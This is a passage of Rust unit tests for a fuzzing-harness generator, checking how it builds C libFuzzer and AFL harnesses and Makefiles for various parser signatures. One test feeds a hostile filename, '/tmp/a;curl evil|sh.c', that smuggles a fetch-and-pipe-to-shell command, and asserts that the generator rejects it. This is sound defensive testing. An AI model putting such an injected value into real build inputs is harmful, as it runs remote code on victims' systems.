                    c_type: "uint8_t *".to_owned(),
                },
                CParameter {
                    name: "length".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "plm_t *".to_owned(),
            target_includes: vec!["plm.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![],
            compile_flags: vec![],
            // Macro-wrapped public declarations (libjpeg's real EXTERN form)
            // can evade the declaration scanner; the exact recipe must still
            // activate from the canonical included header.
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            // The destroy is folded into the if(R) block, so a separately
            // supplied cleanup must be dropped (else double-free / NULL-deref).
            result_cleanup: Some("should_be_dropped(R)".to_owned()),
        };
        let files = generate_c_direct_harness(args).expect("generate");
        let main = fs::read_to_string(&files.main_c).unwrap();
        assert!(
            main.contains("plm_t * R = plm_create_with_memory("),
            "constructs the handle from the fuzz bytes:\n{main}"
        );
        assert!(
            main.contains("if (R) {"),
            "drive loop guarded on a non-NULL handle:\n{main}"
        );
        assert!(
            main.contains("if (!plm_decode_video(R)) break;"),
            "pointer-returning pump stops early at end-of-stream:\n{main}"
        );
        assert!(
            main.contains("plm_pump_void(R);"),
            "non-pointer pump runs to the cap:\n{main}"
        );
        assert!(
            main.contains("< 64;"),
            "per-pump iteration cap is emitted:\n{main}"
        );
        assert!(
            main.contains("plm_destroy(R);"),
            "destroy folded into the if(R) block:\n{main}"
        );
        assert!(
            !main.contains("should_be_dropped"),
            "separate result_cleanup is dropped when a drive plan is present:\n{main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn byte_stream_decoder_emits_per_byte_loop() {
        // PX4 st24_decode(uint8_t byte, uint8_t *rssi, ...): the harness must feed
        // the whole input one byte at a time, not make a single fuzzed call.
        let out = temp_dir("bytestream");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C900".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/st24.c"),
            target: cfunction("st24_decode"),
            params: vec![
                CParameter {
                    name: "byte".to_owned(),
                    c_type: "uint8_t".to_owned(),
                },
                CParameter {
                    name: "rssi".to_owned(),
                    c_type: "uint8_t *".to_owned(),
                },
                CParameter {
                    name: "count".to_owned(),
                    c_type: "uint16_t *".to_owned(),
                },
                CParameter {
                    name: "max".to_owned(),
                    c_type: "uint16_t".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["st24.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/st24.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("for (size_t _gf_i = 0; _gf_i < Size; ++_gf_i)"),
            "byte-stream loop missing:\n{main}"
        );
        assert!(
            main.contains("st24_decode((Data[_gf_i])"),
            "first arg must be the streamed byte:\n{main}"
        );
        // The byte param is NOT decoded from the cursor as a standalone value.
        assert!(
            !main.contains("uint8_t byte ="),
            "byte must be the loop var, not decoded"
        );
    }

    #[test]
    fn rejects_command_injection_in_source_path() {
        let out = temp_dir("inject-src");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C002".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/source.c"),
            target: cfunction("parse"),
            params: vec![CParameter {
                name: "n".to_owned(),
                c_type: "int".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            // Hostile source filename in the scanned tree.
            target_sources: vec![PathBuf::from("/tmp/a;curl evil|sh.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let err = generate_c_direct_harness(args).unwrap_err();
        assert!(matches!(err, HarnessGenError::UnsafeBuildInput(_)));
    }

    #[test]
    fn generate_c_direct_harness_emits_main_and_makefile() {
        let out = temp_dir("emit");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C001".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/source.c"),
            target: cfunction("parse"),
            params: vec![
                CParameter {
                    name: "input".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "max_len".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/source.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("LLVMFuzzerTestOneInput"));
        assert!(
            main.contains(
                "#if defined(_WIN32)\n#define GOVFUZZ_PUBLISH_INPUT(data, size) ((void)0)"
            ) && main.contains("GOVFUZZ_PUBLISH_INPUT(Data, Size);"),
            "Windows harnesses must omit the Linux-only weak runtrace hook:\n{main}"
        );
        // (const char *, size_t) gets pair-detected as a buffer/length view over
        // Data + Size: the callee is GIVEN the length and must respect it, so the
        // buffer borrows Data directly (no NUL copy). An over-read past the stated
        // length is then a REAL bug, not masked by a fabricated terminator.
        assert!(main.contains("const char * input = (const char *)Data"));
        assert!(main.contains("size_t max_len = (size_t)Size"));
        assert!(main.contains("int R = parse(input, max_len);"));
        // The driver NUL-terminates the input buffer (file replay + framed): a
        // harness that hands the raw input to a C-string API must not strlen past
        // an exact-size replay buffer (a replay-only OOB artifact). +1 byte, set 0.
        assert!(main.contains("malloc((size_t)(n ? n : 1) + 1)"));
        assert!(main.contains("b[r] = 0;"));
        assert!(main.contains("malloc(cap + 1)"));
        assert!(main.contains("buf[len] = 0;"));

        let mk = fs::read_to_string(&result.makefile).unwrap();
        assert!(mk.contains("ifeq ($(origin CC), default)"));
        assert!(mk.contains("CC = clang"));
        // #399: the harness ships its own driver main; the default build uses
        // trace-pc-guard coverage and does NOT link libFuzzer's own main.
        assert!(mk.contains("-fsanitize-coverage=trace-pc-guard"));
        assert!(!mk.contains("fsanitize=fuzzer"));
        // UBSan runs with halt_on_error under the engine, so the type/alignment
        // checks that fire on legitimate-but-UB code (typed callbacks called
        // through a generic fn-pointer, unaligned binary-parser reads) abort on
        // every input and the target reports a runtime error with 0 execs. We
        // subtract exactly the OSS-Fuzz-excluded set after -fsanitize=undefined.
        assert!(
            mk.contains("-fsanitize=address,undefined -fno-sanitize=function,vptr,alignment"),
            "default recipe must subtract FP-prone UBSan checks:\n{mk}"
        );
        assert!(mk.contains("main.c"));
        assert!(
            mk.contains("-include ../../c_compat.mk")
                && mk.contains("$(SECTION_FLAGS) $(C_COMPAT_FLAGS)"),
            "C harnesses must honor the auto-detected legacy compatibility cache:\n{mk}"
        );
        assert!(
            mk.contains("SECTION_FLAGS ?= -ffunction-sections -fdata-sections")
                && mk.contains("SECTION_LDFLAGS ?= -Wl,--gc-sections"),
            "C harnesses must discard unreachable dependency sections:\n{mk}"
        );
        assert!(
            mk.contains("afl-clang-fast"),
            "Makefile should declare an AFL build path"
        );
        assert!(
            mk.contains("DGOVFUZZ_AFL"),
            "Makefile should compile AFL build with -DGOVFUZZ_AFL"
        );
        assert!(
            !mk.contains("AFL_CC") && !mk.contains("AFL_CFLAGS"),
            "Makefile must not use the reserved AFL_ env-var prefix",
        );
        assert!(
            main.contains("GOVFUZZ_AFL"),
            "main.c should #ifdef-guard the AFL persistent loop"
        );
        assert!(
            main.contains("LLVMFuzzerTestOneInput"),
            "main.c should still emit the libFuzzer entrypoint as the default"
        );
    }

    #[test]
    fn project_include_dirs_use_iquote_so_system_headers_win() {
        // #366: a project include dir passed as `-I` can shadow a system
        // header of the same name (e.g. capnproto's C++ endian.h shadowing
        // <endian.h>). `-isystem` does NOT fix this (those dirs still precede
        // the built-in system dirs), but `-iquote` does: it is searched only
        // for quoted `#include "..."`, never for angle `#include <...>`. The
        // harness includes its target header via quoted include, so -iquote
        // resolves it while angle system includes resolve to the real header.
        // It is ALSO passed as `-idirafter` so a library whose own source uses an
        // ANGLED self-include (`#include <cwalk.h>`, a common `src/`+`include/`
        // convention) still resolves — searched AFTER the system dirs, so a real
        // system header of the same name still wins (no shadowing).
        let out = temp_dir("iquote");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-ISYS".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/source.c"),
            target: cfunction("parse"),
            params: vec![CParameter {
                name: "input".to_owned(),
                c_type: "const char *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/proj/inc")],
            target_sources: vec![PathBuf::from("/tmp/source.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/rt"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let mk = fs::read_to_string(&result.makefile).unwrap();
        assert!(
            mk.contains("-iquote /proj/inc"),
            "project include dirs must be passed as -iquote: {mk}"
        );
        assert!(
            mk.contains("-idirafter /proj/inc"),
            "project include dirs must ALSO be -idirafter so angled self-includes resolve: {mk}"
        );
        assert!(
            !mk.contains("-I /proj/inc"),
            "project include dirs must NOT be passed as -I (would shadow system headers): {mk}"
        );
        assert!(
            !mk.contains("-isystem /proj/inc"),
            "-isystem does not prevent system-header shadowing; must be -iquote: {mk}"
        );
        assert!(mk.contains("-I ."), "harness cwd must stay -I .: {mk}");
        assert!(
            mk.contains("-I /rt"),
            "the govfuzz c_runtime include must stay -I: {mk}"
        );
    }

    #[test]
    fn generate_c_direct_harness_handles_void_return() {
        let out = temp_dir("emit-void");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C002".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/x.c"),
            target: cfunction("noop"),
            params: vec![],
            return_type: "void".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/x.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            !main.contains("R = noop"),
            "void return should not bind R, got:\n{main}"
        );
        assert!(main.contains("noop();"));
    }

    #[test]
    fn existing_libfuzzer_entrypoint_is_not_wrapped_recursively() {
        let out = temp_dir("c-existing-libfuzzer");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C003".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/fuzz.c"),
            target: cfunction("LLVMFuzzerTestOneInput"),
            params: vec![
                CParameter {
                    name: "data".to_owned(),
                    c_type: "const uint8_t *".to_owned(),
                },
                CParameter {
                    name: "size".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/fuzz.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        let makefile = fs::read_to_string(&result.makefile).unwrap();

        // The project supplies LLVMFuzzerTestOneInput; the harness only DECLARES
        // it (extern) and never defines a body, so it can't be redefined or call
        // itself recursively.
        assert!(
            main.contains("extern int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);"),
            "passthrough harness must declare the project entrypoint extern: {main}"
        );
        assert!(
            !main.contains("int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {"),
            "existing libFuzzer target must not be redefined with a body: {main}"
        );
        // Instead of mixing libFuzzer's own main (the #388 driver-glue crash), the
        // harness provides a lightweight govfuzz driver `main` with a per-spawn and
        // a persistent framed mode, plus a SanitizerCoverage edge-coverage runtime.
        assert!(
            main.contains("int main(int argc, char **argv)"),
            "passthrough harness must provide a govfuzz driver main: {main}"
        );
        assert!(
            main.contains("GOVFUZZ_FRAMED") && main.contains("__sanitizer_cov_trace_pc_guard"),
            "driver must carry the framed protocol + coverage runtime: {main}"
        );
        assert!(
            main.find("#undef getenv") < main.find("getenv(\"GOVFUZZ_COV_SHM\")"),
            "target-header getenv redirects must be cleared before the coverage runtime: {main}"
        );
        // The driver build must NOT link libFuzzer's own main, and must enable the
        // coverage instrumentation the runtime consumes.
        assert!(
            !makefile.contains("-fsanitize=fuzzer,"),
            "passthrough build must drop the -fsanitize=fuzzer link flag: {makefile}"
        );
        assert!(
            makefile.contains("-fsanitize-coverage=trace-pc-guard"),
            "passthrough build must instrument coverage: {makefile}"
        );
        assert!(
            makefile.contains("main.c /tmp/fuzz.c"),
            "project fuzz source should still be linked: {makefile}"
        );
    }

    #[test]
    fn buffer_length_pair_emits_coherent_data_size_decoder() {
        let out = temp_dir("emit-pair");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C004".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/parser.c"),
            target: cfunction("cJSON_ParseWithLength"),
            params: vec![
                CParameter {
                    name: "value".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "buffer_length".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/parser.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();

        assert!(
            main.contains("const char * value = (const char *)Data"),
            "expected pair buffer decoder, got:\n{main}",
        );
        assert!(
            main.contains("size_t buffer_length = (size_t)Size"),
            "expected pair length decoder, got:\n{main}",
        );
        assert!(
            !main.contains("gf_c_string(&Cur, 4096)"),
            "pair-detected buffer should NOT use gf_c_string",
        );
        assert!(
            !main.contains("gf_bounded_length(&Cur"),
            "pair-detected length should mirror Size, not be bounded-decoded",
        );
        assert!(
            !main.contains("free(value)"),
            "pair-detected buffer borrows Data; no free()",
        );
    }

    #[test]
    fn begin_end_pointer_pair_brackets_one_span() {
        // libexpat's `matchkey(const char *start, const char *end, const char *key)`
        // walks `for (; start != end; start++)`. Two independent allocations make
        // that walk leave one heap block toward an unrelated address, which ASan
        // reports as a heap-buffer-overflow in correct library code.
        let out = temp_dir("emit-begin-end");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C005".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/xmlmime.c"),
            target: cfunction("matchkey"),
            params: vec![
                CParameter {
                    name: "start".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "end".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "key".to_owned(),
                    c_type: "const char *".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/xmlmime.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let main = fs::read_to_string(&generate_c_direct_harness(args).unwrap().main_c).unwrap();
        assert!(
            main.contains("const char * start = (const char *)Data"),
            "the begin pointer must borrow the span, got:\n{main}"
        );
        assert!(
            main.contains("const char * end = (const char *)Data + Size"),
            "the end pointer must be the SAME span's end, got:\n{main}"
        );
        assert!(
            !main.contains("free(start)") && !main.contains("free(end)"),
            "a bracketing pair borrows Data; no free()"
        );
        // The unrelated third string is still decoded independently.
        assert!(
            main.contains("key = gf_c_string(&Cur"),
            "an unpaired string must keep its own decoder, got:\n{main}"
        );
    }

    #[test]
    fn cstring_with_int_out_param_nul_terminates_and_does_not_mispair() {
        // te_interp(const char *expression, int *error): `error` is an OUT-PARAM
        // error flag, NOT a length. It must NOT pair with the buffer (which bound
        // `*error = Size` and passed the C-string as the raw, non-NUL-terminated
        // `Data` span, so the parser read past the end — a systematic ASan
        // heap-buffer-overflow FALSE POSITIVE). Instead the string must use the
        // NUL-terminating `gf_c_string` decoder and `error` an out-param scratch.
        let out = temp_dir("emit-cstring-outparam");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C009".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/tinyexpr.c"),
            target: cfunction("te_interp"),
            params: vec![
                CParameter {
                    name: "expression".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "error".to_owned(),
                    c_type: "int *".to_owned(),
                },
            ],
            return_type: "double".to_owned(),
            target_includes: vec!["tinyexpr.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/tinyexpr.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };

        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        // The C-string must be NUL-terminated, not a raw Data cast.
        assert!(
            main.contains("gf_c_string(&Cur"),
            "lone const char* C-string must use the NUL-terminating decoder:\n{main}"
        );
        assert!(
            !main.contains("const char * expression = (const char *)Data"),
            "C-string must NOT be passed as the non-NUL-terminated raw Data span:\n{main}"
        );
        // `error` must be an out-param scratch, NOT bound to Size as a length
        // (the mis-pair emitted `int _gf_in_error = (int)Size`).
        assert!(
            !main.contains("_gf_in_error = (int)Size"),
            "int* error must not be mis-bound as a length:\n{main}"
        );
        assert!(
            main.contains("te_interp(expression, error)"),
            "call must still pass both args:\n{main}"
        );
    }

    #[test]
    fn raw_buffer_with_non_count_int_does_not_mispair() {
        // log_log(int level, const char *file, int line, const char *fmt): `file`
        // is a filename and `line` a line number — NOT a (buffer, length) pair.
        // Mis-pairing bound `file` to the raw non-NUL Data span and `line` to
        // Size, so a %s-print of `file` ran off the end (heap-buffer-overflow
        // FALSE POSITIVE). Neither name is buffer- nor length-shaped, so both
        // must use the standalone NUL-terminating string + scalar decoders.
        let out = temp_dir("emit-file-line-nopair");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C00L".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/log.c"),
            target: cfunction("log_log"),
            params: vec![
                CParameter {
                    name: "level".to_owned(),
                    c_type: "int".to_owned(),
                },
                CParameter {
                    name: "file".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "line".to_owned(),
                    c_type: "int".to_owned(),
                },
                CParameter {
                    name: "fmt".to_owned(),
                    c_type: "const char *".to_owned(),
                },
            ],
            return_type: "void".to_owned(),
            target_includes: vec!["log.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/log.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("char *file = gf_c_string(&Cur"),
            "file must be a NUL-terminated string, not the raw Data span:\n{main}"
        );
        assert!(
            main.contains("int line = gf_i32(&Cur)"),
            "line must be a plain scalar, not Size:\n{main}"
        );
        assert!(
            !main.contains("file = (const char *)Data"),
            "file must not be the raw non-NUL-terminated Data span:\n{main}"
        );
        assert!(
            !main.contains("line = (int)Size"),
            "line must not be mis-bound to Size as a length:\n{main}"
        );
    }

    #[test]
    fn raw_buffer_with_count_named_int_still_pairs() {
        // norm_basic_str(const char *src, int srclen): `src` is buffer-shaped and
        // `srclen` count-shaped, a genuine (buffer, length) pair — it must STILL
        // bind to (Data, Size) so the callee reads exactly the input span (the
        // name-gate must not over-correct and break real pairs).
        let out = temp_dir("emit-src-srclen-pair");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C00P".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/toml.c"),
            target: cfunction("norm_basic_str"),
            params: vec![
                CParameter {
                    name: "src".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "srclen".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "void".to_owned(),
            target_includes: vec!["toml.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/toml.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("src = (const char *)Data"),
            "src must bind to the raw Data span as the paired buffer:\n{main}"
        );
        assert!(
            main.contains("srclen = (int)Size"),
            "srclen must bind to Size as the paired length:\n{main}"
        );
    }

    #[test]
    fn east_const_buffer_length_pair_is_coalesced_not_independently_fuzzed() {
        // id3tag shape: `id3tag_load(void const* data, size_t size, ...)`. East-const
        // (`void const*`) must pair like West-const so `size` mirrors `Size`. Without
        // this, `size` was an INDEPENDENT gf_bounded_length and the callee read far
        // past the real buffer — a spurious OOB (id3tag read 16k from a 23-byte input).
        let out = temp_dir("emit-east-const");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C00E".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/id3.c"),
            target: cfunction("id3tag_load"),
            params: vec![
                CParameter {
                    name: "data".to_owned(),
                    c_type: "void const *".to_owned(),
                },
                CParameter {
                    name: "size".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/id3.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("size = (size_t)Size"),
            "East-const size must mirror Size (paired), got:\n{main}",
        );
        assert!(
            !main.contains("gf_bounded_length(&Cur"),
            "East-const length must NOT be independently fuzzed, got:\n{main}",
        );
    }

    #[test]
    fn const_input_buffer_with_length_pointer_binds_length_to_size() {
        // mz_uncompress2 shape: `(const unsigned char *pSource, mz_ulong *pSource_len)`
        // where `*pSource_len` is the source length the callee reads. It must be
        // bound to the actual buffer size; an independent fuzzed `*pSource_len`
        // larger than the buffer drove a spurious heap-buffer-overflow in miniz's
        // tinfl_decompress (the harness lied about the source length).
        let out = temp_dir("emit-inbuf-lenptr");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C0FF".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/dec.c"),
            target: cfunction("decompress"),
            params: vec![
                CParameter {
                    name: "pSource".to_owned(),
                    c_type: "const unsigned char *".to_owned(),
                },
                CParameter {
                    name: "pSource_len".to_owned(),
                    c_type: "mz_ulong *".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/dec.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("pSource = (const unsigned char *)Data"),
            "input buffer must borrow Data, got:\n{main}",
        );
        assert!(
            main.contains("(mz_ulong)Size") && main.contains("*pSource_len = &_gf_in_pSource_len"),
            "length pointer must bind *pSource_len to the buffer size (Size), got:\n{main}",
        );
        assert!(
            !main.contains("gf_bounded_length(&Cur"),
            "length must NOT be independently fuzzed (would read past the buffer), got:\n{main}",
        );
    }

    #[test]
    fn streaming_byte_cursors_are_coupled_to_their_in_out_counts() {
        // BrotliDecoderDecompressStream shape. Both count/cursor pairs must share
        // real storage boundaries; independent scalar and pointer decoders would
        // manufacture an overread or overwrite in the harness itself.
        let out = temp_dir("emit-stream-cursors");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CSTREAM".to_owned(),
            output_dir: out,
            source_path: PathBuf::from("/tmp/dec.c"),
            target: cfunction("stream_decode"),
            params: vec![
                CParameter {
                    name: "available_in".to_owned(),
                    c_type: "size_t *".to_owned(),
                },
                CParameter {
                    name: "next_in".to_owned(),
                    c_type: "const uint8_t **".to_owned(),
                },
                CParameter {
                    name: "available_out".to_owned(),
                    c_type: "size_t *".to_owned(),
                },
                CParameter {
                    name: "next_out".to_owned(),
                    c_type: "uint8_t **".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/dec.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("_gf_stream_available_in = (size_t)Size"),
            "{main}"
        );
        assert!(
            main.contains("const uint8_t * _gf_stream_next_in = (const uint8_t *)Data"),
            "{main}"
        );
        assert!(
            main.contains(
                "_gf_stream_available_out = (size_t)(_gf_buf_next_out ? _gf_cap_next_out : 0)"
            ),
            "{main}"
        );
        assert!(
            main.contains("uint8_t * _gf_buf_next_out = (uint8_t *)malloc"),
            "{main}"
        );
        assert!(
            main.contains("uint8_t * * next_out = &_gf_stream_next_out"),
            "{main}"
        );
        assert!(main.contains("free(_gf_buf_next_out)"), "{main}");
    }

    #[test]
    fn typed_output_array_with_typedef_count_is_sized_not_independently_fuzzed() {
        // cgltf shape: `read_floats(cgltf_float *out, cgltf_size element_size)` writes
        // `element_size` floats into `out`. `cgltf_size` is a project typedef for
        // size_t the NAME-based length check misses, so the pair went undetected:
        // `out` was a single stack float while `element_size` was fuzzed huge -> a
        // spurious stack-buffer-overflow. The registry-aware count check must pair
        // them so `out` is calloc'd to `element_size` elements.
        let work = temp_dir("emit-typed-array-typedef-count");
        let header_source = r#"
            #include <stddef.h>
            typedef float cgltf_float;
            typedef size_t cgltf_size;
            int read_floats(cgltf_float *out, cgltf_size element_size);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-CTYPED".to_owned(),
            output_dir: work.join("harness"),
            source_path: PathBuf::from("/tmp/rd.c"),
            target: cfunction("read_floats"),
            params: vec![
                CParameter {
                    name: "out".to_owned(),
                    c_type: "cgltf_float *".to_owned(),
                },
                CParameter {
                    name: "element_size".to_owned(),
                    c_type: "cgltf_size".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: Vec::new(),
            target_includes_dirs: Vec::new(),
            target_sources: vec![PathBuf::from("/tmp/rd.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("calloc(_gf_n_out"),
            "output array must be sized to the count (calloc'd), got:\n{main}",
        );
        assert!(
            main.contains("element_size = (cgltf_size)(out ? _gf_n_out : 0)"),
            "count must equal the array's element count, got:\n{main}",
        );
        assert!(
            !main.contains("gf_bounded_length(&Cur, 0, 0x7fffffff)"),
